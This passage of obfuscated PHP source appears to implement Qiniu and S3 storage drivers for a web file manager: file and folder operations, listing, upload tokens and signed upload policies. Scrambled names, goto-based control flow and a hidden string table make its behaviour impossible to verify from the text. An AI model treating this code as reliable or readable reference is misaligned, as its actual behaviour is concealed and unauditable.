mkfile($FÑÙ‹‚±, $aç¹ïÉ»ËÒ = '', $eï»ëí„­š = REPEAT_RENAME) { if ($this->setContent($FÑÙ‹‚±, $aç¹ïÉ»ËÒ)) { return $this->getPathOuter($FÑÙ‹‚±); } return !1; } public function mkdir($B˜ù³ã¾£­, $Fíîç¯ó¡ = REPEAT_SKIP) { goto aÓÛñæå¿Û; aÓÛñæå¿Û: $b»óæÖ‹³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B¹Î¸¯»º˜ = trim($B˜ù³ã¾£­, $b»óæÖ‹³[8]); if ($this->_isFolder($B¹Î¸¯»º˜)) { return $this->getPathOuter($B¹Î¸¯»º˜); } goto D›ŒÂ­„¨„; D›ŒÂ­„¨„: $B˜ù³ã¾£­ = $B¹Î¸¯»º˜ . $b»óæÖ‹³[8]; $f¥ä’ŠÌ£À = get_path_this($B¹Î¸¯»º˜); $bæ‹ÛëšÔ« = $B˜ù³ã¾£­ . $f¥ä’ŠÌ£À; goto f¡ËœÇ¸š; f¡ËœÇ¸š: if (!$this->mkfile($bæ‹ÛëšÔ«)) { return !1; } if (!$this->moveFile($bæ‹ÛëšÔ«, $B˜ù³ã¾£­)) { $this->delFile($bæ‹ÛëšÔ«); return !1; } return $this->getPathOuter($B¹Î¸¯»º˜); goto DˆÃœƒ¥İÉ; DˆÃœƒ¥İÉ: } public function copyFile($c†™í£”Œ, $D¬—´ÆÍÔ¿) { $B‚ŠØîÕ² = $this->bucketManager->copy($this->bucket, $c†™í£”Œ, $this->bucket, $D¬—´ÆÍÔ¿, !0); return $B‚ŠØîÕ² ? !1 : $this->getPathOuter($D¬—´ÆÍÔ¿); } public function moveFile($f×Éóôìëª, $f”ÓíÍâÃÇ) { $B´ÍÄæ×¤ñ = $this->bucketManager->move($this->bucket, $f×Éóôìëª, $this->bucket, $f”ÓíÍâÃÇ, !0); return $B´ÍÄæ×¤ñ ? !1 : $this->getPathOuter($f”ÓíÍâÃÇ); } public function delFile($dí¥ÈŒšË) { $B‡Ùƒ¸¬îº = $this->bucketManager->delete($this->bucket, $dí¥ÈŒšË); return $B‡Ùƒ¸¬îº ? !1 : !0; } public function delFolder($EŒ¸ÈÃ°¾ø) { $fñ ’òä˜¢ = $this->fileList($EŒ¸ÈÃ°¾ø); if (empty($fñ ’òä˜¢)) { return !0; } $a¹£ÆÉÅíŞ = 1000; if (count($fñ ’òä˜¢) <= $a¹£ÆÉÅíŞ) { return $this->qnDelObj($fñ ’òä˜¢) ? !1 : !0; } foreach (array_chunk($fñ ’òä˜¢, $a¹£ÆÉÅíŞ) as $E‹ÂìÀ¤Ü) { $e““‚‚‹î· = $this->qnDelObj($E‹ÂìÀ¤Ü); if ($e““‚‚‹î·) { return !1; } } return !0; } private function qnDelObj($b‹ùòßÁÜ) { $Bá®ËÚ®’› = $this->bucketManager->buildBatchDelete($this->bucket, $b‹ùòßÁÜ); list($CÔŸòÃÃ, $fç¬¿ƒ†Ğ) = $this->bucketManager->batch($Bá®ËÚ®’›); return $fç¬¿ƒ†Ğ; } private function fileList($b§¶ÄÙàƒä, $f³ÁîÂÅéĞ = 0) { goto CÁ­‚ÍŸ; CÁ­‚ÍŸ: $A™ï…Ï¶¤‘ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b§¶ÄÙàƒä = trim($b§¶ÄÙàƒä, $A™ï…Ï¶¤‘[8]); $A‹Ÿ‡ÈçÅ = empty($b§¶ÄÙàƒä) ? $A™ï…Ï¶¤‘[33] : $b§¶ÄÙàƒä . $A™ï…Ï¶¤‘[8]; goto CíŠÖâ¡Ó¼; CíŠÖâ¡Ó¼: $dèÉÚ‚¼Òã = $A™ï…Ï¶¤‘[33]; $A•™³Ì¼öµ = 1000; $AÂÀ—ØÄïÒ = $A™ï…Ï¶¤‘[33]; goto f¿šÙîÚ»; f¿šÙîÚ»: $Cã¡áê®êğ = array(); while (!0) { list($fÕ–´è½“, $eÊÏ ì¥) = $this->bucketManager->listFiles($this->bucket, $A‹Ÿ‡ÈçÅ, $dèÉÚ‚¼Òã, $A•™³Ì¼öµ, $AÂÀ—ØÄïÒ); if ($eÊÏ ì¥) { return !1; } $dèÉÚ‚¼Òã = array_key_exists($A™ï…Ï¶¤‘[1187], $fÕ–´è½“) ? $dèÉÚ‚¼Òã = $fÕ–´è½“[$A™ï…Ï¶¤‘[1218]] : $A™ï…Ï¶¤‘[33]; foreach ($fÕ–´è½“[$A™ï…Ï¶¤‘[1219]] as $D‰à£“†ÀŞ) { $Dã‰ßÀèŞ = $D‰à£“†ÀŞ[$A™ï…Ï¶¤‘[89]]; if ($f³ÁîÂÅéĞ) { $Dã‰ßÀèŞ = array($A™ï…Ï¶¤‘[28] => $Dã‰ßÀèŞ, $A™ï…Ï¶¤‘[77] => $D‰à£“†ÀŞ[$A™ï…Ï¶¤‘[1220]]); } $Cã¡áê®êğ[] = $Dã‰ßÀèŞ; } if ($dèÉÚ‚¼Òã == $A™ï…Ï¶¤‘[33]) { break; } } return $Cã¡áê®êğ; goto EîğÄˆêÌ; EîğÄˆêÌ: } public function rename($A·ƒÖª , $DæÑøºÒˆ) { return $this->renameObject($A·ƒÖª , $DæÑøºÒˆ); } public function fileInfo($Eô•Î¡²ä¤, $B¦ò²»…—Ä = false, $cÌ‡Ã åŠÔ = array()) { goto C¿¸êˆ‰ã; d°¤“ôšÆ: return $AêÊ…¤àÀ; goto fÆ‡ãÃÂè; C¿¸êˆ‰ã: $d‰‹ñ–Õ‹Š =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($B¦ò²»…—Ä) { return array($d‰‹ñ–Õ‹Š[28] => $this->pathThis($Eô•Î¡²ä¤), $d‰‹ñ–Õ‹Š[75] => $this->getPathOuter($d‰‹ñ–Õ‹Š[8] . $Eô•Î¡²ä¤), $d‰‹ñ–Õ‹Š[29] => $d‰‹ñ–Õ‹Š[167], $d‰‹ñ–Õ‹Š[77] => isset($cÌ‡Ã åŠÔ[$d‰‹ñ–Õ‹Š[1220]]) ? $cÌ‡Ã åŠÔ[$d‰‹ñ–Õ‹Š[1220]] : 0, $d‰‹ñ–Õ‹Š[160] => $this->ext($Eô•Î¡²ä¤)); } $AêÊ…¤àÀ = array($d‰‹ñ–Õ‹Š[28] => $this->pathThis($Eô•Î¡²ä¤), $d‰‹ñ–Õ‹Š[75] => $this->getPathOuter($d‰‹ñ–Õ‹Š[8] . $Eô•Î¡²ä¤), $d‰‹ñ–Õ‹Š[29] => $d‰‹ñ–Õ‹Š[167], $d‰‹ñ–Õ‹Š[187] => 0, $d‰‹ñ–Õ‹Š[107] => 0, $d‰‹ñ–Õ‹Š[77] => 0, $d‰‹ñ–Õ‹Š[160] => $this->ext($Eô•Î¡²ä¤), $d‰‹ñ–Õ‹Š[188] => !0, $d‰‹ñ–Õ‹Š[189] => !0); goto c¾ñ“ÈÅÖõ; c¾ñ“ÈÅÖõ: if (empty($cÌ‡Ã åŠÔ)) { $cÌ‡Ã åŠÔ = $this->objectMeta($Eô•Î¡²ä¤); if (!$cÌ‡Ã åŠÔ) { return $AêÊ…¤àÀ; } } if (isset($cÌ‡Ã åŠÔ[$d‰‹ñ–Õ‹Š[1221]])) { $AêÊ…¤àÀ[$d‰‹ñ–Õ‹Š[107]] = substr($cÌ‡Ã åŠÔ[$d‰‹ñ–Õ‹Š[1221]] . $d‰‹ñ–Õ‹Š[33], 0, 10); } if (isset($cÌ‡Ã åŠÔ[$d‰‹ñ–Õ‹Š[1220]])) { $AêÊ…¤àÀ[$d‰‹ñ–Õ‹Š[77]] = $cÌ‡Ã åŠÔ[$d‰‹ñ–Õ‹Š[1220]]; } goto d°¤“ôšÆ; fÆ‡ãÃÂè: } public function folderInfo($FĞÁœÜƒÓ, $aéØòØï¤ = false) { goto D”½­×Éö„; cÈ ´ãäÌ¥: return $FÀÇˆ´çöø; goto aº§„˜‹Àõ; D”½­×Éö„: $Dê°Ç©»…„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($aéØòØï¤) { return array($Dê°Ç©»…„[28] => $this->pathThis($FĞÁœÜƒÓ), $Dê°Ç©»…„[75] => $this->getPathOuter($Dê°Ç©»…„[8] . $FĞÁœÜƒÓ), $Dê°Ç©»…„[29] => $Dê°Ç©»…„[76]); } $FÀÇˆ´çöø = array($Dê°Ç©»…„[28] => $this->pathThis($FĞÁœÜƒÓ), $Dê°Ç©»…„[75] => $this->getPathOuter($Dê°Ç©»…„[8] . $FĞÁœÜƒÓ), $Dê°Ç©»…„[29] => $Dê°Ç©»…„[76], $Dê°Ç©»…„[187] => 0, $Dê°Ç©»…„[107] => 0, $Dê°Ç©»…„[1166] => !0, $Dê°Ç©»…„[1167] => !0); goto d·‚óÛßñ‹; d·‚óÛßñ‹: $FĞÁœÜƒÓ = rtrim($FĞÁœÜƒÓ, $Dê°Ç©»…„[8]) . $Dê°Ç©»…„[8]; $fœÕù³ø»Ç = $this->objectMeta($FĞÁœÜƒÓ); if (isset($fœÕù³ø»Ç[$Dê°Ç©»…„[1221]])) { $FÀÇˆ´çöø[$Dê°Ç©»…„[107]] = substr($fœÕù³ø»Ç[$Dê°Ç©»…„[1221]] . $Dê°Ç©»…„[33], 0, 10); } goto cÈ ´ãäÌ¥; aº§„˜‹Àõ: } public function listPath($D¦¢¨ÉÌé×, $f†Ü°¼Â¹× = false) { goto e½È¶Í’àÎ; cÈ¶—Ó‚³£: $béæé¯Í— = $e¬ÕØ¯ë¼¸[33]; $B¢–ÀˆÁï = 1000; $e®öºñõŞâ = $e¬ÕØ¯ë¼¸[8]; goto aÆö·Œ°ñÃ; e½È¶Í’àÎ: $e¬ÕØ¯ë¼¸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D¦¢¨ÉÌé× = trim($D¦¢¨ÉÌé×, $e¬ÕØ¯ë¼¸[8]); $f¹Û•â•í’ = empty($D¦¢¨ÉÌé×) ? $e¬ÕØ¯ë¼¸[33] : $D¦¢¨ÉÌé× . $e¬ÕØ¯ë¼¸[8]; goto cÈ¶—Ó‚³£; aÆö·Œ°ñÃ: $c÷Ö´²œ = $dÜõîØïêô = array(); while (!0) { list($cÀ„¦‘Øä, $C½Öè²Ù²) = $this->bucketManager->listFiles($this->bucket, $f¹Û•â•í’, $béæé¯Í—, $B¢–ÀˆÁï, $e®öºñõŞâ); if ($C½Öè²Ù²) { return !1; } $béæé¯Í— = array_key_exists($e¬ÕØ¯ë¼¸[1187], $cÀ„¦‘Øä) ? $béæé¯Í— = $cÀ„¦‘Øä[$e¬ÕØ¯ë¼¸[1218]] : $e¬ÕØ¯ë¼¸[33]; if (isset($cÀ„¦‘Øä[$e¬ÕØ¯ë¼¸[1222]])) { foreach ($cÀ„¦‘Øä[$e¬ÕØ¯ë¼¸[1222]] as $Bñ«áíùŞé) { if ($Bñ«áíùŞé == $f¹Û•â•í’) { continue; } $c÷Ö´²œ[] = $this->folderInfo($Bñ«áíùŞé, $f†Ü°¼Â¹×); } } if (isset($cÀ„¦‘Øä[$e¬ÕØ¯ë¼¸[1219]])) { foreach ($cÀ„¦‘Øä[$e¬ÕØ¯ë¼¸[1219]] as $EŒÕ‰…‹•Ç) { if ($EŒÕ‰…‹•Ç[$e¬ÕØ¯ë¼¸[89]] == $f¹Û•â•í’) { continue; } $dÜõîØïêô[] = $this->fileInfo($EŒÕ‰…‹•Ç[$e¬ÕØ¯ë¼¸[89]], $f†Ü°¼Â¹×, $EŒÕ‰…‹•Ç); } } if ($béæé¯Í— == $e¬ÕØ¯ë¼¸[33]) { break; } } return array($e¬ÕØ¯ë¼¸[74] => $c÷Ö´²œ, $e¬ÕØ¯ë¼¸[73] => $dÜõîØïêô); goto D¸î¼øŸ¶ç; D¸î¼øŸ¶ç: } public function has($aµò…†®—, $d¼ù®é…É¹ = false, $Aßâ°§íİ’ = true) { goto c´†ÊÌŠºÈ; fŒ‚–í—ò›: if ($d¼ù®é…É¹) { return array($d—äêö„ç[191] => $B¬¥ô™†Áµ, $d—äêö„ç[192] => $c÷°‚ĞáÇè); } return !1; goto cÂŒİ‘–šƒ; E…ÜŸß’‘‰: $BÛ›ÈãĞ¤¶ = $d—äêö„ç[33]; $E¦”©‹òí = 1000; $AŠšÍÏ¹ìÌ = $d—äêö„ç[8]; goto B¢¿æñÁä; B¢¿æñÁä: $B¬¥ô™†Áµ = 0; $c÷°‚ĞáÇè = 0; while (!0) { list($AÅ¥çÜóÅˆ, $E§ö®ç‘¤) = $this->bucketManager->listFiles($this->bucket, $D´ªä¹”¾, $BÛ›ÈãĞ¤¶, $E¦”©‹òí, $AŠšÍÏ¹ìÌ); if ($E§ö®ç‘¤) { return !1; } $BÛ›ÈãĞ¤¶ = array_key_exists($d—äêö„ç[1187], $AÅ¥çÜóÅˆ) ? $BÛ›ÈãĞ¤¶ = $AÅ¥çÜóÅˆ[$d—äêö„ç[1218]] : $d—äêö„ç[33]; if ($d¼ù®é…É¹) { if (!empty($AÅ¥çÜóÅˆ[$d—äêö„ç[1219]])) { $B¬¥ô™†Áµ += count($AÅ¥çÜóÅˆ[$d—äêö„ç[1219]]); } if (!empty($AÅ¥çÜóÅˆ[$d—äêö„ç[1222]])) { $c÷°‚ĞáÇè += count($AÅ¥çÜóÅˆ[$d—äêö„ç[1222]]); } if ($BÛ›ÈãĞ¤¶ === $d—äêö„ç[33]) { break; } continue; } if ($Aßâ°§íİ’) { if (!empty($AÅ¥çÜóÅˆ[$d—äêö„ç[1219]])) { return !0; } } else { if (!empty($AÅ¥çÜóÅˆ[$d—äêö„ç[1222]])) { return !0; } } if ($BÛ›ÈãĞ¤¶ == $d—äêö„ç[33]) { break; } } goto fŒ‚–í—ò›; c´†ÊÌŠºÈ: $d—äêö„ç =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aµò…†®— = trim($aµò…†®—, $d—äêö„ç[8]); $D´ªä¹”¾ = empty($aµò…†®—) ? $d—äêö„ç[33] : $aµò…†®— . $d—äêö„ç[8]; goto E…ÜŸß’‘‰; cÂŒİ‘–šƒ: } public function listAll($fÀ»Ó·ÜÕ‚) { $F—¾ÕÙ‘¾™ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B»…Õõõ·„ = $this->fileList($fÀ»Ó·ÜÕ‚, 1); $B¥á„àÀÑÊ = array(); foreach ($B»…Õõõ·„ as $f§—ß™÷¬) { $B¥á„àÀÑÊ[$f§—ß™÷¬[$F—¾ÕÙ‘¾™[28]]] = $f§—ß™÷¬[$F—¾ÕÙ‘¾™[77]]; } return $this->listAllFiles($fÀ»Ó·ÜÕ‚, array_keys($B¥á„àÀÑÊ), $B¥á„àÀÑÊ); } public function canRead($cÃŞŞİ¸‹·) { return $this->exist($cÃŞŞİ¸‹·) ? !0 : !1; } public function canWrite($cƒ¸É°ÖÌñ) { return $this->exist($cƒ¸É°ÖÌñ) ? !0 : !1; } public function getContent($C¶Í«Ò‡¤«) { return $this->fileSubstr($C¶Í«Ò‡¤«, 0, -1); } public function setContent($dªÇ…»£‰Ò, $D‚§’ê¼ã‘ = '') { $fª¢¡Ä›Ú´ = $this->tempFile($this->pathThis($dªÇ…»£‰Ò)); file_put_contents($fª¢¡Ä›Ú´, $D‚§’ê¼ã‘); if ($this->upload($dªÇ…»£‰Ò, $fª¢¡Ä›Ú´)) { $this->tempFileRemve($fª¢¡Ä›Ú´); return !0; } return !1; } public function refreshUrls($E¶½´ç¥ƒŠ) { goto dÕØŸÁ„£š; d‡’…±ŸÉ: return $DÃí½ªÌ•ö[$d’†´„é„[1223]] == $d’†´„é„[697] ? !0 : !1; goto FÒê¥è ; dÕØŸÁ„£š: $d’†´„é„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EŞŠŸ¼©ÂĞ = array(); if (is_array($E¶½´ç¥ƒŠ)) { foreach ($E¶½´ç¥ƒŠ as $dÖñ’¥î‡µ) { $EŞŠŸ¼©ÂĞ[] = $this->link($dÖñ’¥î‡µ); } } else { $EŞŠŸ¼©ÂĞ[] = $this->link($E¶½´ç¥ƒŠ); } goto BÓö»‘í‹†; BÓö»‘í‹†: $b’à¯ø¾ò = new Qiniu\Cdn\CdnManager($this->auth); list($DÃí½ªÌ•ö, $Eãæº—ãŸ) = $b’à¯ø¾ò->refreshUrls($EŞŠŸ¼©ÂĞ); if ($Eãæº—ãŸ) { return !1; } goto d‡’…±ŸÉ; FÒê¥è : } public function fileSubstr($båÆóì¶Ê, $fí•ŸÌ‘, $eã¯Ñ’ó¿) { $dÍš£Ò’¡É =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!($FŞ¥ñîÊ´æ = $this->link($båÆóì¶Ê))) { return !1; } $D´ìÆ„èë = !1; if ($eã¯Ñ’ó¿ > 0) { $Aé‚îóÕğ = $fí•ŸÌ‘ + $eã¯Ñ’ó¿ - 1; $D´ìÆ„èë = array($dÍš£Ò’¡É[1224] . $fí•ŸÌ‘ . $dÍš£Ò’¡É[412] . $Aé‚îóÕğ); } $eÄÛè…Ëøã = url_request($FŞ¥ñîÊ´æ, $dÍš£Ò’¡É[216], !1, $D´ìÆ„èë); return $eÄÛè…Ëøã[$dÍš£Ò’¡É[690]] ? $eÄÛè…Ëøã[$dÍš£Ò’¡É[1038]] : !1; } public function upload($B•ºÌİõÛÏ, $AÇ‚Úßø…Å, $FÑØ¿©ö˜³ = false, $bÒææøî† = REPEAT_REPLACE) { $aøà”ø¯Ï = new Qiniu\Storage\UploadManager(); $a»¥¹¾¢¥• = $this->auth->uploadToken($this->bucket, $B•ºÌİõÛÏ); $aãİñÁ¥‚¯ = get_file_mime(get_path_ext($AÇ‚Úßø…Å)); list($bîÎ„Š¹ , $Aœ…´ì™¶Ò) = $aøà”ø¯Ï->putFile($a»¥¹¾¢¥•, $B•ºÌİõÛÏ, $AÇ‚Úßø…Å, null, $aãİñÁ¥‚¯); return $Aœ…´ì™¶Ò ? !1 : $this->getPathOuter($B•ºÌİõÛÏ); } public function uploadFormData($EÊƒ¬¡î¯°, $A§ˆå­ùŸÈ = 3600) { return $this->uploadToken($EÊƒ¬¡î¯°, $A§ˆå­ùŸÈ); } public function multiUploadFormData($CÖ«Îêà, $C„Óç¹•ò³ = 3600) { return $this->uploadToken($CÖ«Îêà, $C„Óç¹•ò³); } private function uploadToken($BŠÃ÷õîÉé, $E‹°Ú»¡Á = 3600) { goto F„§î„ˆÏˆ; F„§î„ˆÏˆ: $A­‚¬ª‰Å© =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÚÓ£ã‡¬¤ = $E‹°Ú»¡Á; $EÔÎò…¡‡á = array($A­‚¬ª‰Å©[1225] => $A­‚¬ª‰Å©[1226]); goto d‘ÓÀ›‘‚ù; FÄæ‘›ó¹‚: $d’áôĞèœá = http_type() . "\72\57\x2f\165\160\x6c\x6f\141\144{$c·¢ÅãÍÄ}\56\x71\151\x6e\151\x75\160\56\x63\157\155\57"; return array($A­‚¬ª‰Å©[1228] => $b¸á©Ê¦é’, $A­‚¬ª‰Å©[1229] => $d’áôĞèœá); goto aº²˜ËÔÊñ; d‘ÓÀ›‘‚ù: $Dó¢•¬¦ğ˜ = null; $b¸á©Ê¦é’ = $this->auth->uploadToken($this->bucket, $Dó¢•¬¦ğ˜, $FÚÓ£ã‡¬¤, $EÔÎò…¡‡á, !0); $c·¢ÅãÍÄ = empty($this->region) || $this->region == $A­‚¬ª‰Å©[1227] ? $A­‚¬ª‰Å©[33] : $A­‚¬ª‰Å©[412] . $this->region; goto FÄæ‘›ó¹‚; aº²˜ËÔÊñ: } public function download($cğŞ“µ¤­É, $F˜İÓÍß¹¤) { goto e½òø«£ãÕ; d™¼¨…“®: fclose($E§Å­–†¥³); return $F˜İÓÍß¹¤; goto eôª‹„¥œ; C¹îˆÕ‡Ë‡: $d÷ê‡§‹² = 1024 * 200; $E§Å­–†¥³ = fopen($C—ßÌÀ¡ëà, $_SERVER[´Ù×Íå‘ÄõÛ][1230]); while (!0) { $CÄâùÂÉ…† = $this->fileSubstr($cğŞ“µ¤­É, $F¹Û‘Š¡Úí, $d÷ê‡§‹²); if ($CÄâùÂÉ…† === !1) { return !1; } fwrite($E§Å­–†¥³, $CÄâùÂÉ…†); $F¹Û‘Š¡Úí += $d÷ê‡§‹²; if (strlen($CÄâùÂÉ…†) < $d÷ê‡§‹²) { break; } } goto d™¼¨…“®; e½òø«£ãÕ: $C—ßÌÀ¡ëà = IO::getPathInner(IO::mkfile($F˜İÓÍß¹¤)); if (!($f¸¥İà„Ûº = $this->link($cğŞ“µ¤­É))) { return !1; } $F¹Û‘Š¡Úí = 0; goto C¹îˆÕ‡Ë‡; eôª‹„¥œ: } public function link($A¼…ÜÏ°ø, $B¿àŞÁ„ğ– = '') { if (!$this->isFile($A¼…ÜÏ°ø)) { return !1; } $c„Î«øï£ = $this->getHost() . $_SERVER[´Ù×Íå‘ÄõÛ][8] . $this->pathEncode($A¼…ÜÏ°ø) . $B¿àŞÁ„ğ–; return $this->auth->privateDownloadUrl($c„Î«øï£, 3600 * 12); } public function fileOut($b­ó”Çßõ÷, $EŒÇÆ£Èæ = false, $c„œ¶ëëÅÖ = false, $FòÑ¶×–×è = '') { $AÄÙÚÇ®´” =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->isFileOutServer()) { return $this->fileOutServer($b­ó”Çßõ÷, $EŒÇÆ£Èæ, $c„œ¶ëëÅÖ, $FòÑ¶×–×è); } if (!$c„œ¶ëëÅÖ) { $c„œ¶ëëÅÖ = $this->pathThis($b­ó”Çßõ÷); } $d‘óƒÂ‚ìø = $EŒÇÆ£Èæ ? $AÄÙÚÇ®´”[1231] . rawurlencode($c„œ¶ëëÅÖ) : $AÄÙÚÇ®´”[33]; $d±‡ØîÃÍù = $this->link($b­ó”Çßõ÷, $d‘óƒÂ‚ìø); $this->fileOutLink($d±‡ØîÃÍù); } public function fileOutServer($bê ŒŠÑƒŸ, $Dï´»„¸ñ‚ = false, $D¿ïçö±¼Œ = false, $eÍ¶òÇë‡ƒ = '') { parent::fileOut($bê ŒŠÑƒŸ, $Dï´»„¸ñ‚, $D¿ïçö±¼Œ, $eÍ¶òÇë‡ƒ); } public function fileOutImage($f¹â‚éÊ, $b¬ï¤¦µÀš = 250) { $bÑÉ÷†¾Ì¡ = $this->link($f¹â‚éÊ, $_SERVER[´Ù×Íå‘ÄõÛ][1232] . $b¬ï¤¦µÀš); $this->fileOutLink($bÑÉ÷†¾Ì¡); } public function fileOutImageServer($F–ÜÇîÚÉª, $bÙàç«ÓÅ„ = 250) { parent::fileOutImage($F–ÜÇîÚÉª, $bÙàç«ÓÅ„); } public function hashMd5($DëØô‚Ù½˜) { $c²ùï‡Ú¥‘ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FŒ‰–ì£Û = $this->objectMeta($DëØô‚Ù½˜); return isset($FŒ‰–ì£Û[$c²ùï‡Ú¥‘[196]]) ? $FŒ‰–ì£Û[$c²ùï‡Ú¥‘[196]] : !1; $B‘Ñá“êö¸ = $this->link($DëØô‚Ù½˜, $c²ùï‡Ú¥‘[1233]); } public function size($aĞèù¸¸•è) { $dñ÷Ä‡ã· = $this->objectMeta($aĞèù¸¸•è); return $dñ÷Ä‡ã· ? $dñ÷Ä‡ã·[$_SERVER[´Ù×Íå‘ÄõÛ][77]] : 0; } public function info($eÔ¨ ÌŠõĞ) { if ($this->isFolder($eÔ¨ ÌŠõĞ)) { return $this->folderInfo($eÔ¨ ÌŠõĞ); } else { if ($this->isFile($eÔ¨ ÌŠõĞ)) { return $this->fileInfo($eÔ¨ ÌŠõĞ); } } return !1; } public function exist($B¤ŠÂ½õ»Õ) { return $this->isFile($B¤ŠÂ½õ»Õ) || $this->isFolder($B¤ŠÂ½õ»Õ); } public function isFile($EÙË¸÷§Ñ–) { return !$this->isFolder($EÙË¸÷§Ñ–) && $this->objectMeta($EÙË¸÷§Ñ–); } public function isFolder($aÒ©à²—¼Ï) { return $this->cacheMethod($_SERVER[´Ù×Íå‘ÄõÛ][223], $aÒ©à²—¼Ï); } protected function objectMeta($AÁ¦‘°ø´) { return $this->cacheMethod($_SERVER[´Ù×Íå‘ÄõÛ][224], $AÁ¦‘°ø´); } protected function _objectMeta($c«¶‡‚‰§‚) { $C‹­„šÚ¼™ =& $_SERVER[´Ù×Íå‘ÄõÛ]; list($Eî“â‚ÏÇˆ, $c™¹Œ‚è†‰) = $this->bucketManager->stat($this->bucket, $c«¶‡‚‰§‚); if ($Eî“â‚ÏÇˆ) { $Eî“â‚ÏÇˆ[$C‹­„šÚ¼™[77]] = intval($Eî“â‚ÏÇˆ[$C‹­„šÚ¼™[1220]]); } return $Eî“â‚ÏÇˆ; } protected function _isFolder($Fêß¥Ô’Òˆ) { $fµÌ©ß­òË =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($Fêß¥Ô’Òˆ == $fµÌ©ß­òË[33] || $Fêß¥Ô’Òˆ == $fµÌ©ß­òË[8]) { return !0; } list($b¥–óç×‚, $aŸÓ¤¬ßÀ†) = $this->bucketManager->listFiles($this->bucket, trim($Fêß¥Ô’Òˆ, $fµÌ©ß­òË[8]) . $fµÌ©ß­òË[8], $fµÌ©ß­òË[33], 1, $fµÌ©ß­òË[8]); return !empty($b¥–óç×‚[$fµÌ©ß­òË[1219]]) || !empty($b¥–óç×‚[$fµÌ©ß­òË[1222]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($b„…âë‰³) { parent::__construct($b„…âë‰³); } public function uploadFormData($E…œĞ‚¥§ğ, $f°êïí„ƒ  = 3600) { goto D®è…‰×¹à; D®è…‰×¹à: $E„¤—è·‹ï =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AĞÍ±¹´×¦ = $E„¤—è·‹ï[185]; $a¨ùØ‘¨¯ß = $E„¤—è·‹ï[1138]; goto b•ñ¨©¿ä; aƒÁƒí×”: $eï©õå = base64_encode(json_encode($aÈ£ÚçøòÕ)); $EğˆŞ„¥¶å = hash_hmac($E„¤—è·‹ï[1148], $B°”íÑ¿Ë, $E„¤—è·‹ï[1149] . $this->secret, !0); $C¿ºåÖ‘Ç = hash_hmac($E„¤—è·‹ï[1148], $this->region, $EğˆŞ„¥¶å, !0); goto CÄ…”À©â; aøâİæÊ è: $F«®‚ˆñ = $E„¤—è·‹ï[1140]; $dáŸé™˜º½ = $f°êïí„ƒ  . $E„¤—è·‹ï[33]; $eÚÒ¤ÄÀ°¶ = $E„¤—è·‹ï[1104]; goto F·ìÌºéÔ›; CÄ…”À©â: $EğÓ×ƒŞ¬ = hash_hmac($E„¤—è·‹ï[1148], $EªÒ¤‡†…, $C¿ºåÖ‘Ç, !0); $c¢ªš®ä‡ê = hash_hmac($E„¤—è·‹ï[1148], $F«®‚ˆñ, $EğÓ×ƒŞ¬, !0); $a±¥ê®İ‚ = hash_hmac($E„¤—è·‹ï[1148], $eï©õå, $c¢ªš®ä‡ê); goto E¡Ì»Ï“ğ‚; F·ìÌºéÔ›: $B„ˆŸõÆ¶Ş = array($this->accessKey, $B°”íÑ¿Ë, $this->region, $EªÒ¤‡†…, $F«®‚ˆñ); $cÖš”’áÏÎ = implode($E„¤—è·‹ï[8], $B„ˆŸõÆ¶Ş); $aÈ£ÚçøòÕ = array($E„¤—è·‹ï[1106] => gmdate($E„¤—è·‹ï[1105], strtotime($E„¤—è·‹ï[1141])), $E„¤—è·‹ï[1107] => array(array($E„¤—è·‹ï[1109] => $this->bucket), array($E„¤—è·‹ï[1108] => $AĞÍ±¹´×¦), array($E„¤—è·‹ï[1110], $E„¤—è·‹ï[1111], $E„¤—è·‹ï[33]), array($E„¤—è·‹ï[1110], $E„¤—è·‹ï[1142], $E„¤—è·‹ï[33]), array($E„¤—è·‹ï[1110], $E„¤—è·‹ï[1143], $E„¤—è·‹ï[33]), array($E„¤—è·‹ï[1112] => $eÚÒ¤ÄÀ°¶), array($E„¤—è·‹ï[1144] => $cÖš”’áÏÎ), array($E„¤—è·‹ï[1145] => $a¨ùØ‘¨¯ß), array($E„¤—è·‹ï[1146] => $b‘öÉòÊÑ), array($E„¤—è·‹ï[1147] => $dáŸé™˜º½))); goto aƒÁƒí×”; b•ñ¨©¿ä: $EªÒ¤‡†… = $E„¤—è·‹ï[59]; $b‘öÉòÊÑ = gmdate($E„¤—è·‹ï[1139]); $B°”íÑ¿Ë = gmdate($E„¤—è·‹ï[691]); goto aøâİæÊ è; E¡Ì»Ï“ğ‚: $A÷œ¿İí¯ˆ = array($E„¤—è·‹ï[199] => $E„¤—è·‹ï[33], $E„¤—è·‹ï[1150] => $E„¤—è·‹ï[33], $E„¤—è·‹ï[1108] => $AĞÍ±¹´×¦, $E„¤—è·‹ï[1112] => $eÚÒ¤ÄÀ°¶, $E„¤—è·‹ï[1116] => $eï©õå, $E„¤—è·‹ï[1151] => $cÖš”’áÏÎ, $E„¤—è·‹ï[1152] => $a¨ùØ‘¨¯ß, $E„¤—è·‹ï[1153] => $b‘öÉòÊÑ, $E„¤—è·‹ï[1154] => $dáŸé™˜º½, $E„¤—è·‹ï[1155] => $a±¥ê®İ‚, $E„¤—è·‹ï[169] => $this->getHost()); return $A÷œ¿İí¯ˆ; goto c›ğ“‡Á¾‰; c›ğ“‡Á¾‰: } public function multiUploadFormData($D­Šƒƒã½÷, $fèŠ¾¨À• = 3600) { $fíİİøò´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f¬¡©ÖÇ‹Œ = gmdate($fíİİøò´[1234]); $Eìƒñ˜†¯ = array(); $eîæ½“óÕÀ = $this->client->getUploadId($this->bucket, $D­Šƒƒã½÷, $Eìƒñ˜†¯); if (!$eîæ½“óÕÀ) { return !1; } return array($fíİİøò´[209] => $eîæ½“óÕÀ, $fíİİøò´[169] => $this->getHost() . 